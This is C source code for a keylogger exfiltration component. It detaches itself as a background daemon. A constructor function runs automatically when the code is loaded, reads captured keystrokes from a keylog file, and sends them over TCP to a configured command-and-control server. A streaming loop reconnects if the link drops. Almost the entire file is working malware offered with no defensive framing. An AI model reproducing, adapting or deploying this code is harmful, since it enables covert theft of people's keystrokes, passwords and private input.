#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <signal.h>
#include "config.h"

static void daemonize()
{
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS); // parent exits

    if (setsid() < 0) exit(EXIT_FAILURE);

    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    umask(0);
    chdir("/");

    for (int i = 0; i < 3; i++)
        close(i);
}

static int send_keylogs(const char *data, size_t len)
{
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    struct sockaddr_in serv_addr = {
        .sin_family = AF_INET,
        .sin_port = htons(KEYLOG_PORT),
    };

    if (inet_pton(AF_INET, KEYLOG_SERVER_IP, &serv_addr.sin_addr) <= 0) {
        close(sock);
        return -1;
    }

    if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        close(sock);
        return -1;
    }

    send(sock, data, len, 0);
    close(sock);
    return 0;
}

static int connect_to_c2()
{
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    struct sockaddr_in serv_addr = {
        .sin_family = AF_INET,
        .sin_port = htons(KEYLOG_PORT),
    };

    if (inet_pton(AF_INET, KEYLOG_SERVER_IP, &serv_addr.sin_addr) <= 0) {
        close(sock);
        return -1;
    }

    if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        close(sock);
        return -1;
    }

    return sock;
}

__attribute__((constructor))
static void init_keylog_exfil()
{
    daemonize();

    if (1)
    {
        char buf[BUFFER_SIZE];
        FILE *f = fopen(KEYLOG_PATH, "r");
        if (!f) return;

        size_t len = fread(buf, 1, BUFFER_SIZE - 1, f);
        fclose(f);

        buf[len] = '\0';
        DBG("Read %zu bytes from /proc/keylog\n", len);
        DBG("%s\n", buf);

        if (len > 0)
            send_keylogs(buf, len);
    }
    else
    {
        int fd = open(KEYLOG_PATH, O_RDONLY | O_NONBLOCK);
        if (fd < 0) return;

        int sock = -1;
        char buf[BUFFER_SIZE];

        while (1) {
            fd_set readfds;
            FD_ZERO(&readfds);
            FD_SET(fd, &readfds);

            // Wait for data to be available or timeout after 5 seconds
            struct timeval timeout = {5, 0};
            int ret = select(fd + 1, &readfds, NULL, NULL, &timeout);

            if (ret > 0 && FD_ISSET(fd, &readfds)) {
                ssize_t len = read(fd, buf, sizeof(buf) - 1);
                if (len > 0) {
                    buf[len] = '\0';

                    if (sock < 0) {
                        sock = connect_to_c2();
                        if (sock < 0) {
                            sleep(5);
                            continue;
                        }
                    }

                    ssize_t sent = send(sock, buf, len, 0);
                    if (sent < 0) {
                        close(sock);
                        sock = -1;
                        // Try reconnect on next loop iteration
                    }
                }
            } else if (ret == 0) {
                // Timeout: no data, just continue and loop again
                continue;
            } else {
                // select error or fd closed
                break;
            }
        }

        if (sock >= 0)
            close(sock);
        close(fd);
    }
}
